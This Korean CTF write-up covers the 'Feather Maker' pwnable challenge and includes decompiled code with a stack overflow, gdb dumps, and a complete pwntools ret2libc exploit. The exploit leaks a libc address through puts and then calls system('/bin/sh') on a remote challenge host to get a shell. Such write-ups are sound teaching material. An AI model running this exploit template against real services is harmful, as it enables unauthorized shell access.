## Explain
```c
int banner()
{
  puts("-------------------");
  puts("  Feather Maker  ");
  puts("-------------------");
  return puts("Make your own feather here!");
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  banner();
  vuln();
  return 0;
}

ssize_t vuln()
{
  _BYTE buf[304]; // [esp+4h] [ebp-134h] BYREF

  return read(0, buf, 0x15Eu);
}

```
`main` 함수는 `vuln();`을 호출하고 종료하는 흐름을 가진다. 
핵심 로직은 모두 `vuln` 함수 안에 있으므로, 익스플로잇 시에는 `vuln`이 진입점이 되고 `main`은 ROP 체인에서 ret-to-main으로 재사용할 수 있는 함수가 된다.

`vuln` 함수는 `_BYTE buf[304];`를 지역 변수로 잡고, `read(0, buf, 0x15E);`를 호출한다. 이때 `buf`의 크기는 304(0x130)바이트인데 `read`는 최대 0x15E(350)바이트까지 읽도록 되어 있어 버퍼보다 최대 46바이트를 더 덮을 수 있다는 점을 이용하자!


```bash
banda@seyeon:~/pwnable/FeatherFather$ checksec --file=chall
[*] '/home/banda/pwnable/FeatherFather/chall'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8046000)
    RUNPATH:    b'.'
    Stripped:   No

```
NX Enabled가 스택을 실행 불가능한 영역으로 만드는 것만 조심하면 될 것 같다.

```gdb
pwndbg> p/x $ebp
$1 = 0xfff900f8

pwndbg> p/x *(unsigned int*)($ebp+4)
$2 = 0x80492ac

pwndbg> x/20xw $ebp+4
0xfff900fc:     0x080492ac      0x41414141      0x41414141      0x08049070
0xfff9010c:     0x08049070      0x0804c010      0xf7d83470      0x00000000
0xfff9011c:     0xf7cc5cb9      0x00000001      0xfff901d4      0xfff901dc
0xfff9012c:     0xfff90140      0xf7ed1e34      0x080490ad      0x00000001
0xfff9013c:     0xfff901d4      0xf7ed1e34      0xfff901dc      0xf7f18b60

```
`$ebp`는 `0xfff900f8`로 찍혔고, `*(unsigned int*)($ebp+4)` 값은 `0x080492ac`로 나온다. 이 값은 현재 프레임에서 리턴 시 점프할 EIP, 즉 saved EIP를 나타낸다. `x/20xw $ebp+4`를 보면 다음과 같은 형태로 나와 있다.

0x080492ac → saved EIP (리턴 주소)
0x41414141, 0x41414141, 0x08049070, ...

이 덤프에서 `0x41414141`은 우리가 보낸 패딩 'A'들이고, `0x08049070` 등은 puts@plt같은 바이너리 주소들이다. 즉, 현재 페이로드가 스택에 들어간 상태에서 saved EIP 바로 뒤쪽에 우리가 의도한 ROP 체인의 일부와 'A' 패턴이 섞여 있다.



```
pad=296 -> no leak
pad=300 -> no leak
pad=304 -> no leak
pad=308 -> no leak
pad=312 -> OK
found leak: 0xf7ded140
raw output (hex): 2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0a202046656174686572204d616b657220200a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0a4d616b6520796f7572206f776e20666561746865722068657265210a40d1def70a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0a202046656174686572204d616b657220200a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0a4d616b6520796f7572206f776e20666561746865722068657265210a
libc base: 0xf7d75000
system: 0xf7dc5430 binsh: 0xf7f39de8

```



## Exploit
```python
from pwn import *
import time

host = "chall.v1t.site"
port = 30212
libc = ELF('./libc.so.6')
exe = ELF('./chall')
context.arch = 'i386'
pad = 312

def recv_all(r, timeout=1.0):
    data = b''
    t0 = time.time()
    while time.time()-t0 < timeout:
        try:
            chunk = r.recv(timeout=0.2)
        except EOFError:
            break
        if not chunk:
            continue
        data += chunk
    return data

def find_leak(data):
    for i in range(len(data)-3):
        v = u32(data[i:i+4])
        if 0xf7000000 <= v <= 0xf7ffffff or 0x7f000000 <= v <= 0x7fffffff:
            return v
    return None

r = remote(host, port)
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_addr = exe.symbols['main']

p1 = b'A'*pad + p32(puts_plt) + p32(main_addr) + p32(puts_got)
r.send(p1)
data = recv_all(r, timeout=2.0)
leak = find_leak(data)
if not leak:
    print("no leak, raw:", data.hex())
    r.close()
    exit(1)

base = leak - libc.symbols['puts']
system = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))

payload2 = b'A'*pad + p32(system) + p32(main_addr) + p32(binsh)
r.send(payload2)
r.interactive()

```
익스플로잇은 pwntools를 이용해 두 단계로 구성한다. 

먼저 원격 또는 로컬 프로세스에 접속한 뒤, 배너 출력은 그대로 받아 버리고 패딩 312바이트 뒤에 `puts_plt`, `main`, `puts_got`를 순서대로 배치한 페이로드를 전송한다. 이렇게 하면 vuln에서 리턴할 때 EIP가 puts@plt로 바뀌고, 첫 번째 인자로 puts@got가 전달되어 puts가 자신의 GOT 엔트리에 저장된 실제 libc 주소를 출력한 뒤 다시 main으로 돌아가게 된다. 

수신한 출력에서 4바이트를 뽑아 puts의 주소를 얻고, `libc_base = leak - libc.sym["puts"]`로 libc 베이스를 계산한다. 이어서 `system = libc_base + libc.sym["system"]`, `binsh = libc_base + next(libc.search(b"/bin/sh"))`를 구한 다음, 2단계 페이로드를 다시 패딩 312바이트 뒤에 `system`, `main`, `binsh` 순서로 구성해 보내면 vuln의 리턴 시 system("/bin/sh")가 호출되며 쉘을 얻을 수 있다.

즉, 스택 오버플로우로 리턴 주소를 제어한 뒤, puts를 이용해 libc 주소를 누출하고, 계산한 system과 "/bin/sh" 주소로 ret2libc 2단계 체인을 구성하는 전형적인 익스플로잇이라고 볼 수 있었다.

## Solved
![](pwnable/Feather%20Father/image1.png)